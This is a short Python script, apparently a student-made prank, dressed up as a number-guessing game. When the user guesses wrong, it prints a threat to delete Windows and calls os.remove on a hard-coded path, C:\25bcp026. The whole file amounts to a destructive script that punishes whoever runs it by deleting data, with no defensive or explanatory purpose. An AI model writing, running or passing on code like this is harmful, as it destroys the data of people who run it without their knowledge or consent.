import random
import os 
def delete_windows() :
    x = random.randint(1,100)
    y = int(input("Enter a number between 1 to 100 : "))
    if x == y :
        print("You are safe !!")
    else :
        print("This windows will deleted soon !!")
        os.remove(r"C:\25bcp026")




delete_windows()